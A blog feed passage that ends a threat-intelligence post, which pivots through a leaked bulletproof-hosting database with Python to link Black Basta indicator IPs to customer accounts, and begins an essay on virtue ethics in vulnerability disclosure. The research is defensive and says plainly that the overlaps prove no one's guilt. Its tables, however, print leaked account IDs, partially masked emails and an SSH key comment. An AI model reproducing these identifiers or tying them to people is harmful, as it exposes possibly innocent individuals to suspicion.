      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBVAxj75sjjDnExWoIfbK24HIEcwiEQtx4HujnbTgHEdJJwZGyiOj9iombEIUkaLzdKVmSI6bp0iG+onRINM+SAxJtZk6e8zQElygyE8whQnjdpQXm3xvE+8pOVG67whE+tSXUsLV5lj7Y8JUdcDSd2JN0aZH4bCCHwQ9kawwvRL04cKjHS2HfTWVgPuoLQLUxu9bIODCR/9WkmY4Pmgi6NJ6F2wT1nuShE+2+XJXtYquGpcXyIZV2SBxHPZMxab0kz/XfSW+Jq6csZoEd88pVdKGrVsNnveuM7OxMb5XTL58XTAscnZ4VJfHoiVa2Ohw3KojojfleizICA6XHqeOOqIZBzg6WVVmNeYy5CZHnyW65syAjFZJA9j3uMhCE7NpkeaQ8jxiSX4vEEcVcBnSUXviWVAMfWHbI6z/jll5mXmZLHXkz7+JWNM+4pT6PS0UMOZNvv+xuTP5DB6bVBgoGu0S926HW/V75oy+yRwgYAd6Z71HTTVX06tPjbY+q9QiBpK/DhKvEAWGU8WMW/pP4ReZXaihNV7XyM+F1NccjMT+9XyhSKwNpUrNHOruHW6QlEa//VqviDT2WeQuMMl0rrSMMNNQxT0pOLEUmypqOagwYk5IRxhOC6d6/AYHxzR+2uVhe17V4ow1P2XWS2qvOI6eKmopU38WOiEsnSfq8NQ== trans@E-matrex</code></td>
    </tr>
    <tr>
      <td>3</td>
      <td style="text-align: left">mvm*****1+<number>@gmail.com</number></td>
      <td style="text-align: left">Earlier mentioned <code class="language-plaintext highlighter-rouge">mvmpp@LAPTOP-9M7611VJ</code> key</td>
    </tr>
    <tr>
      <td>4</td>
      <td style="text-align: left">mvm*****1+2009@gmail.com, mvm*****1+2209@gmail.com</td>
      <td style="text-align: left">Earlier mentioned <code class="language-plaintext highlighter-rouge">valentina@valentina-ubuntu</code> key</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 5: SSH key reuse clusters</span></p>

<p>This type of clustering helps discover the scale of the infrastructure that some of these accounts are managing. Cluster 2, for example, has a total IP assignment of 8661 IP addresses over two years. Knowing that SSH public keys are reused on this infrastructure is useful, as <a href="https://www.usenix.org/conference/usenixsecurity25/presentation/munteanu">recent research</a> has shown that these public keys can be scanned for. This may allow us to discover new criminal infrastructure in the long run.</p>

<h1 id="hunting-black-basta">Hunting Black Basta</h1>
<p>So far, I have stayed inside the boundaries of the Media Land leak itself. To understand how this infrastructure was actually used in the wild, I cross-referenced the internal IP-assignment history with publicly known indicators of compromise. For this first pass, I focused on infrastructure linked to the Black Basta ransomware group. The sanctions mentioned in the introduction describe that Media Land is accused of facilitating both the Lockbit and Black Basta ransomware group, and Black Basta had a <a href="https://www.trellix.com/blogs/research/analysis-of-black-basta-ransomware-chat-leaks/">leak of their own</a> in February 2025, providing access to over 200,000 internal messages. Researchers earlier processed these messages to extract all the relevant information (among which all mentioned IP addresses), noting that the timeline of the leak is between September 2023 and 2024.</p>

<h2 id="method-from-ioc-list-to-media-land-users">Method: from IOC list to Media Land users</h2>
<p>The Black Basta indicators are available through <a href="https://www.virustotal.com/gui/collection/4e6f6cbc3b769747ddc749d52ee980119af2ef30ad48c5f216638a3fa2602081/iocs">VirusTotal</a>. For this analysis, I downloaded the IP addresses extracted from this leak and filtered it to IPv4 addresses. Using Python, and after loading the IPs, two simple functions help link IP addresses to users and vice versa.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"""</span><span class="s">
Two functions pivoting through the Media Land leak, using the user_user, network_ip,
and network_ip_history tables. Assumes that `network_history` contains one row per
assignment interval with normalised start_at/end_at timestamps (UTC).
</span><span class="sh">"""</span>
<span class="k">def</span> <span class="nf">who_had_ip_at</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">intervals</span><span class="o">=</span><span class="n">network_history</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nf">to_datetime</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">utc</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="n">sub</span> <span class="o">=</span> <span class="n">intervals</span><span class="p">[</span><span class="n">intervals</span><span class="p">[</span><span class="sh">"</span><span class="s">host_ip</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="n">ip</span><span class="p">]</span>

    <span class="n">active</span> <span class="o">=</span> <span class="n">sub</span><span class="p">[</span>
        <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">t</span><span class="p">)</span> <span class="o">&amp;</span>
        <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">].</span><span class="nf">isna</span><span class="p">()</span> <span class="o">|</span> <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">t</span><span class="p">))</span>
    <span class="p">]</span>

    <span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">host_ip</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">address</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">subscription_id</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">assignment_type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">assignment_id</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cols</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">active</span><span class="p">.</span><span class="n">columns</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">active</span><span class="p">[</span><span class="n">cols</span><span class="p">].</span><span class="nf">reset_index</span><span class="p">(</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">what_ips_user_had_at</span><span class="p">(</span><span class="n">user_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">t</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">pd</span><span class="p">.</span><span class="n">Timestamp</span><span class="p">],</span> <span class="n">intervals</span><span class="o">=</span><span class="n">network_history</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nf">to_datetime</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">utc</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">sub</span> <span class="o">=</span> <span class="n">intervals</span><span class="p">[</span><span class="n">intervals</span><span class="p">[</span><span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="n">user_id</span><span class="p">]</span>

    <span class="n">active</span> <span class="o">=</span> <span class="n">sub</span><span class="p">[</span>
        <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">t</span><span class="p">)</span> <span class="o">&amp;</span>
        <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">].</span><span class="nf">isna</span><span class="p">()</span> <span class="o">|</span> <span class="p">(</span><span class="n">sub</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">t</span><span class="p">))</span>
    <span class="p">]</span>

    <span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">address</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">subscription_id</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">assignment_type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ip_entity</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">assignment_id</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">cols</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cols</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">active</span><span class="p">.</span><span class="n">columns</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">active</span><span class="p">[</span><span class="n">cols</span><span class="p">].</span><span class="nf">reset_index</span><span class="p">(</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p><span class="centered-text">Listing 6: Functions to pivot in the Media Land leak</span></p>

<p>For the function <code class="language-plaintext highlighter-rouge">what_ips_user_had_at()</code>, a date is obviously good to have. Luckily, we know that the Black Basta messages were sent between September ‘23 and September ‘24. Using the two functions in Listing 6, we could test single IP addresses. By executing <code class="language-plaintext highlighter-rouge">who_had_ip_at("194.26.25.111", "2024")</code>, the function returns two users:</p>

<table>
  <thead>
    <tr>
      <th>host_ip</th>
      <th style="text-align: left">user_id</th>
      <th style="text-align: left">email</th>
      <th style="text-align: left">start_at</th>
      <th>end_at</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>194.26.25.111</td>
      <td style="text-align: left">8f728d4a-687e-4aea-bd8d-b44256f5b30c</td>
      <td style="text-align: left">gr******sov@mail.ru</td>
      <td style="text-align: left">2024-06-23 13:03:10.129669+00:00</td>
      <td>NaN</td>
    </tr>
    <tr>
      <td>194.26.25.111</td>
      <td style="text-align: left">dfa89b88-7d98-4e57-a3c1-785a8e78c1f0</td>
      <td style="text-align: left">an**************nesm@gmail.com</td>
      <td style="text-align: left">2023-12-08 08:47:40.070893+00:00</td>
      <td>2024-06-23 13:03:10.129669+00:00</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 7: Looking up single IP address from VirusTotal collection</span></p>

<p>One of these accounts we have seen before! It is Mister Reseller, whom we found trying to pivot for password reuse! When we look in the profiles we generated earlier, Mister Reseller had 1902 unique IP assignments on this account with the aforementioned ~8.5 BTC in payments. This user also has an explosive number of subscriptions on his account. That is significant, so the next part is about counting which users relate to the Black Basta indicators.</p>

<p><img src="../../../assets/profile_blackbasta.png" alt="" />
<span class="centered-text">Figure 3: Found profile connected to Black Basta indicators</span></p>

<h2 id="enumerating-all-accounts-that-managed-black-basta-indicators">Enumerating all accounts that managed Black Basta indicators</h2>
<p>With the <code class="language-plaintext highlighter-rouge">what_ips_user_had_at()</code> and <code class="language-plaintext highlighter-rouge">who_had_ip_at()</code> functions, we can scale to count the number of users that (and more importantly, what users) managed an IP address related to Black Basta between September 2023 and September 2024. Now, as we are looking at a hoster, it is plausible that these users are sharing an IP address due to, for example, shared hosting. According to Media Land’s registration, however, these are all rented Virtual Machines with their own IP address. According to <em>network_ip_history</em>, each of the Black Basta-related IPs appears to be assigned to a single user_id at any point in time, with no overlapping assignments in the leak.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">count_ioc_ips_per_user_2024</span><span class="p">(</span>
    <span class="n">ioc_df</span><span class="p">:</span> <span class="n">pd</span><span class="p">.</span><span class="n">DataFrame</span><span class="p">,</span>
    <span class="n">network_hist_df</span><span class="p">:</span> <span class="n">pd</span><span class="p">.</span><span class="n">DataFrame</span><span class="p">,</span>
    <span class="n">users_df</span><span class="p">:</span> <span class="n">pd</span><span class="p">.</span><span class="n">DataFrame</span> <span class="o">|</span> <span class="bp">None</span> <span class="o">=</span> <span class="bp">None</span>
<span class="p">)</span> <span class="o">-&gt;</span> <span class="n">pd</span><span class="p">.</span><span class="n">DataFrame</span><span class="p">:</span>

    <span class="c1"># Assuming ioc_df has a colunn "ip"
</span>    <span class="n">ioc_ips</span> <span class="o">=</span> <span class="nf">set</span><span class="p">(</span><span class="n">ioc_df</span><span class="p">.</span><span class="nf">astype</span><span class="p">(</span><span class="nb">str</span><span class="p">).</span><span class="nb">str</span><span class="p">.</span><span class="nf">strip</span><span class="p">())</span>

    <span class="n">df</span> <span class="o">=</span> <span class="n">network_hist_df</span><span class="p">.</span><span class="nf">copy</span><span class="p">()</span>
    <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nf">to_datetime</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">],</span> <span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">coerce</span><span class="sh">"</span><span class="p">,</span> <span class="n">utc</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">]</span>   <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nf">to_datetime</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">],</span>   <span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">coerce</span><span class="sh">"</span><span class="p">,</span> <span class="n">utc</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at_filled</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at</span><span class="sh">"</span><span class="p">].</span><span class="nf">fillna</span><span class="p">(</span><span class="n">pd</span><span class="p">.</span><span class="n">Timestamp</span><span class="p">.</span><span class="nb">max</span><span class="p">.</span><span class="nf">tz_localize</span><span class="p">(</span><span class="sh">"</span><span class="s">UTC</span><span class="sh">"</span><span class="p">))</span>

    <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">ip_only</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">address</span><span class="sh">"</span><span class="p">].</span><span class="nf">apply</span><span class="p">(</span><span class="n">strip_ip</span><span class="p">)</span>
    <span class="n">df</span> <span class="o">=</span> <span class="n">df</span><span class="p">[</span><span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">ip_only</span><span class="sh">"</span><span class="p">].</span><span class="nf">isin</span><span class="p">(</span><span class="n">ioc_ips</span><span class="p">)]</span>

    <span class="n">start</span> <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nc">Timestamp</span><span class="p">(</span><span class="sh">"</span><span class="s">2023-09-01T00:00:00Z</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">end</span>   <span class="o">=</span> <span class="n">pd</span><span class="p">.</span><span class="nc">Timestamp</span><span class="p">(</span><span class="sh">"</span><span class="s">2024-09-01T00:00:00Z</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">df</span> <span class="o">=</span> <span class="n">df</span><span class="p">[(</span><span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">start_at</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="sh">"</span><span class="s">end_at_filled</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">start</span><span class="p">)]</span>

    <span class="k">if</span> <span class="n">df</span><span class="p">.</span><span class="n">empty</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pd</span><span class="p">.</span><span class="nc">DataFrame</span><span class="p">()</span>

    <span class="n">counts</span> <span class="o">=</span> <span class="p">(</span>
        <span class="n">df</span><span class="p">[[</span><span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ip_only</span><span class="sh">"</span><span class="p">]]</span>
        <span class="p">.</span><span class="nf">dropna</span><span class="p">()</span>
        <span class="p">.</span><span class="nf">drop_duplicates</span><span class="p">()</span>
        <span class="p">.</span><span class="nf">groupby</span><span class="p">(</span><span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">)[</span><span class="sh">"</span><span class="s">ip_only</span><span class="sh">"</span><span class="p">]</span>
        <span class="p">.</span><span class="nf">nunique</span><span class="p">()</span>
        <span class="p">.</span><span class="nf">reset_index</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">n_ioc_ips_2024</span><span class="sh">"</span><span class="p">)</span>
        <span class="p">.</span><span class="nf">sort_values</span><span class="p">(</span><span class="sh">"</span><span class="s">n_ioc_ips_2024</span><span class="sh">"</span><span class="p">,</span> <span class="n">ascending</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">users_df</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">counts</span> <span class="o">=</span> <span class="n">counts</span><span class="p">.</span><span class="nf">merge</span><span class="p">(</span>
            <span class="n">users_df</span><span class="p">[[</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">]].</span><span class="nf">rename</span><span class="p">(</span><span class="n">columns</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">}),</span>
            <span class="n">on</span><span class="o">=</span><span class="sh">"</span><span class="s">user_id</span><span class="sh">"</span><span class="p">,</span>
            <span class="n">how</span><span class="o">=</span><span class="sh">"</span><span class="s">left</span><span class="sh">"</span><span class="p">,</span>
        <span class="p">)</span>

    <span class="k">return</span> <span class="n">counts</span>
</code></pre></div></div>

<p><span class="centered-text">Listing 8: Enumerating users associated with the IP addresses mentioned by Black Basta in their leaks</span></p>

<table>
  <thead>
    <tr>
      <th>user_id</th>
      <th style="text-align: left">bb_ips_sept_2324</th>
      <th style="text-align: left">email</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>8f728d4a-687e-4aea-bd8d-b44256f5b30c</td>
      <td style="text-align: left">207</td>
      <td style="text-align: left">gr*****sov@mail.ru</td>
    </tr>
    <tr>
      <td>49b144f3-2648-4598-b7c3-c8a9bb42e60c</td>
      <td style="text-align: left">62</td>
      <td style="text-align: left">yash<strong>**</strong><em>**</em>5@gmail.com</td>
    </tr>
    <tr>
      <td>dfa89b88-7d98-4e57-a3c1-785a8e78c1f0</td>
      <td style="text-align: left">36</td>
      <td style="text-align: left">anton<strong>**</strong><strong>**</strong>*m@gmail.com</td>
    </tr>
    <tr>
      <td>40e151cc-121f-4f90-bbfd-4e819c4e144a</td>
      <td style="text-align: left">27</td>
      <td style="text-align: left">anto<strong>**</strong>*****3@proton.me</td>
    </tr>
    <tr>
      <td>2deb1533-552e-409b-bd90-d59fb1c0a706</td>
      <td style="text-align: left">25</td>
      <td style="text-align: left">pa*****t@gmail.com</td>
    </tr>
    <tr>
      <td>303a9cbe-5c15-4329-bd0e-0f600769408d</td>
      <td style="text-align: left">21</td>
      <td style="text-align: left">zhou<strong>**</strong><strong>**</strong>@gamail.com</td>
    </tr>
    <tr>
      <td>ef0e1ba8-8323-4cd6-b2a2-194cd488052e</td>
      <td style="text-align: left">20</td>
      <td style="text-align: left">chern<strong>**</strong><strong>**</strong>3@gmail.com</td>
    </tr>
    <tr>
      <td>67f41c34-1dbe-4747-a304-08ff2ad75429</td>
      <td style="text-align: left">18</td>
      <td style="text-align: left">jea<strong>**</strong>*****s@gmail.com</td>
    </tr>
    <tr>
      <td>30346179-3b8a-4c72-9120-9f8d64f3c74d</td>
      <td style="text-align: left">18</td>
      <td style="text-align: left">mur<strong>**</strong><em>**</em>outlook.com</td>
    </tr>
    <tr>
      <td>2c04a9e3-499d-4a42-b415-12223586531e</td>
      <td style="text-align: left">17</td>
      <td style="text-align: left">luci<strong>**</strong>**4@proton.me</td>
    </tr>
  </tbody>
</table>

<p><span class="centered-text">Listing 9: Top 10 users associated with Black Basta IP addresses between September ‘23 and ‘24</span></p>

<p>Of course, this does not immediately mean that we found all the Black Basta criminals and can now send them emails. In total, scouring the leak for these IPs produced a list of 74 distinct user accounts whose assigned IPs between September ‘23 and ‘24 overlap with the Black Basta IOC list. Most of these accounts only have a handful of matches (one or two IPs), which is consistent with Black Basta being Ransomware-as-a-Service. Therefore, it could be that Media Land also had some Black Basta affiliates on their networks. More importantly, however, is the detail of the account with the largest footprint having the account name “Mister Reseller”. Thus, it could as well be that these accounts are acting as a reseller to Black Basta, brokering access to the Media Land infrastructure. As Figure 4 shows, there is one account that stands out in terms of footprint.</p>

<p><img src="../../../assets/blackbasta_gantt.png" alt="" />
<span class="centered-text">Figure 4: Gantt diagram of all accounts managing Black Basta indicators, the time they had them for, and how many</span></p>

<p>It is worth stressing that these overlaps do not prove that any given account belongs to Black Basta themselves. However, they illustrate how internal hosting records and abuse indicators can be combined to at least reveal a supply-chain layer behind a ransomware operation: which customers provisioned the infrastructure later used in attacks, and which intermediaries may have been brokering access.</p>

<h1 id="why-this-leak-matters">Why this leak matters</h1>
<p>With the UK, US, and Australia having announced sanctions against Media Land for being a Bulletproof Hoster, this leak gives a rare look into how this type of infrastructure actually operates. Its value lies in the structural patterns that emerge across billing, provisioning, and IP assignment. Taken together, these records show how services are organised, how address space is recycled at scale, and how reseller-like entities act as intermediaries between the platform and the actors who rely on it.</p>

<p>Linking the internal history to external indicators such as the Black Basta IPs does not identify individuals. It does, however, reveal part of the supply chain behind ransomware operations by showing which customer segments provisioned infrastructure later used in attacks and how access may have been brokered.</p>

<p>For defenders and researchers, this shifts the focus from single malicious IPs to the ecosystem that generates them. Leaks like this help build an evidence-based understanding of how bulletproof hosting functions in practice and where meaningful points of intervention may exist.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Research Progress" /><category term="Observations on Threat Intelligence" /><summary type="html"><![CDATA[This post reconstructs how sanctioned Bulletproof Hoster Media Land’s internal platform organised users, subscriptions, and address space, based on a leaked dataset. By linking lifecycle records to known Black Basta indicators, it highlights how customer segments and reseller-like entities provisioned infrastructure later used in ransomware activity. The findings illustrate how internal hosting data can reveal the supply-chain dynamics behind malicious operations]]></summary></entry><entry><title type="html">Virtue Before Permission: The Ethical Character of Vulnerability Disclosure</title><link href="http://localhost:4000/2025/10/28/virtue-before-permission-ethical-vulnerability-disclosure.html" rel="alternate" type="text/html" title="Virtue Before Permission: The Ethical Character of Vulnerability Disclosure" /><published>2025-10-28T00:00:00+01:00</published><updated>2025-10-28T00:00:00+01:00</updated><id>http://localhost:4000/2025/10/28/virtue-before-permission-ethical-vulnerability-disclosure</id><content type="html" xml:base="http://localhost:4000/2025/10/28/virtue-before-permission-ethical-vulnerability-disclosure.html"><![CDATA[<blockquote>
  <p><strong>Summary:</strong>
Public-interest vulnerability disclosure depends not only on clear rules but on the moral character of those who apply them. Virtue is not an addition to ethics but its precondition. Without honesty, restraint, and care, deontology becomes bureaucracy and consequentialism becomes opportunism. This post explores how the cultivation of virtue through self-control, courage, humility, and practical wisdom makes responsible disclosure possible. Trust, not permission, is what turns unsolicited hacking into civic service.</p>
</blockquote>

<p>In the ethics of vulnerability disclosure, most debates revolve around rules and risks. We ask when it is acceptable to exploit a vulnerability, how to disclose it, and when to hold back. Frameworks like Coordinated Vulnerability Disclosure (CVD) as well as <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">Threshold Deontology and Principlism</a> help answer these questions by balancing autonomy, fairness, harm prevention, and accountability.</p>

<p>Yet all of these approaches assume something more fundamental: that the people applying them already possess the judgment and restraint to do so well. Ethical decision-making in cybersecurity begins not with the rulebook but with the kind of person who opens it.</p>

<p>Vulnerability disclosure, especially when unsolicited, depends on trust: the trust that a researcher will act with care, that their motives are civic rather than self-serving, and that they will stop where help ends and intrusion begins. That kind of trust cannot be mandated by law or codified in policy. It comes from character, from a moral culture that values restraint as much as curiosity.</p>

<p>The text below explores that foundation. Virtue ethics, an older tradition often overshadowed by rules and consequences, can help us understand why public-interest disclosure works in some contexts and not in others. It shifts the question from the justification of an act to the motivation and discipline of the person committing it.</p>

<h1 id="from-rules-to-character">From Rules to Character</h1>

<p>Virtue ethics does not begin with isolated actions but with habits of moral excellence. Rather than prescribing what to do, it asks who we should become and how repeated practice forms reliable judgment. In <a href="https://open.library.okstate.edu/introphilosophy/chapter/virtue-ethics/">Aristotle’s words</a>, virtue is a cultivated disposition to choose the mean between extremes, guided by <em>phronesis</em>, or practical wisdom.</p>

<p>This way of thinking fits naturally with the craft of ethical hacking.<br />
Good vulnerability disclosure is not a formula to follow but a skill to refine. It demands sensitivity to context, proportion, and consequence. Just as a craftsperson improves through careful repetition, security researchers develop their sense of restraint, transparency, and fairness through each disclosure that is discussed and reviewed.</p>

<p>Shannon Vallor <a href="https://academic.oup.com/book/25951">argues</a> in <em>Technology and the Virtues</em> that modern technological practice requires more than compliance with rules. It calls for the cultivation of <em>technomoral virtues</em>: moral habits that help us act well under conditions of uncertainty. Vallor identifies twelve: honesty, self-control, humility, justice, courage, empathy, care, civility, flexibility, perspective, magnanimity, and wisdom.</p>

<p>Not all of these are equally central to vulnerability disclosure.<br />
The work of securing systems depends most on honesty, self-control, justice, courage, care, humility, and practical wisdom. These virtues shape how researchers handle risk, power, and uncertainty: when to probe further, when to stop, and how to communicate what they find. Others such as civility, magnanimity, and empathy are not absent, but they belong more to the broader social negotiation of technology than to the focused ethics of discovery and disclosure.</p>

<p>Together, these core virtues give disclosure its moral texture:</p>
<ul>
  <li>Honesty and justice ground communication in fairness and accuracy.</li>
  <li>Self-control prevents curiosity from becoming intrusion.</li>
  <li>Courage allows action where inaction would leave others at risk.</li>
  <li>Humility and care temper expertise with respect for those affected.</li>
  <li>And <em>phronesis</em>, or practical wisdom, binds them together by helping researchers recognise when a strict rule would itself cause harm.</li>
</ul>

<p>Truly ethical vulnerability disclosure is therefore not only about applying a deontological or consequentialist view. It embodies the virtues that make those frameworks meaningful. <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">Threshold Deontology</a>, for instance, depends on actors who can tell when restraint turns into negligence. That kind of judgment cannot be automated or legislated. It must be cultivated through the discipline of balancing duty with care.</p>

<p>Virtue, in that sense, is the condition that makes ethics work at all. Without the habits of restraint, honesty, and care, deontology becomes bureaucracy and consequentialism becomes opportunism. Virtue keeps both from collapsing into moral convenience.</p>

<h1 id="the-virtues-behind-vulnerability-disclosure">The Virtues Behind Vulnerability Disclosure</h1>

<p>Virtue becomes visible through trust: the social capital that turns unsolicited action into civic contribution rather than intrusion. Trust allows unsolicited disclosure to be read as help, not harm. It is the reason a report from a volunteer hacker can reach a national authority instead of only a prosecutor’s desk. When researchers act with restraint, communicate clearly, and document their methods transparently, they make their motives legible. Over time, that legibility becomes a form of moral infrastructure. It gives institutions and vendors confidence that those who uncover vulnerabilities do so in service of the public, not for profit or prestige.</p>

<p>This dynamic is visible in places where disclosure has matured into a civic practice. In the Netherlands, for example, cooperation between the hacking community and public agencies has produced a steady accumulation of social and moral capital. Each well-handled disclosure reinforces the expectation that unsolicited research is guided by care and proportion. That expectation, in turn, lowers the perceived risk of collaboration. Ethical trust becomes procedural trust.</p>

<p>Still, it would be too simple to say that this success rests only on virtue. The Dutch model also reflects legal pragmatism and institutional learning. Agencies interpret good-faith intrusion charitably not only because they trust researchers’ intent but because the arrangement has proven socially efficient. In that sense, moral and institutional trust strengthen each other.</p>

<p>The visibility of virtue also depends on the context that surrounds it. In high-trust societies such as the Netherlands, restraint and transparency are interpreted as signs of integrity. In lower-trust contexts, such as the United States, where cooperation between researchers and the state is more contested, similar gestures are often read through contractual mechanisms like bug-bounty programs. Social capital does not replace virtue, but it shapes whether virtue is recognised as such. And in low-trust environments, individual integrity becomes even more important to bridge institutional suspicion.</p>

<h1 id="when-virtue-meets-policy">When Virtue Meets Policy</h1>

<p>Yet trust alone cannot guarantee legitimacy. There are laws for good reason. Law and policy can formalise processes, but they cannot create virtue. Article 12 of the <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX%3A32022L2555">NIS2 Directive</a> promotes Coordinated Vulnerability Disclosure and defines expectations for the handling of notifications. It prescribes contact points, timelines, and reporting channels. Yet none of these instruments can replace the moral judgment required to act responsibly under uncertainty or without consent.</p>

<p>Where virtue ethics explains <em>why</em> one should act, laws and policies provide the <em>conditions</em> under which such action is recognised as legitimate. Virtue without structure risks arbitrariness, while structure without virtue can produce proceduralism and distrust. The two do not always harmonise, but when they do, moral reliability sustains legal legitimacy.</p>

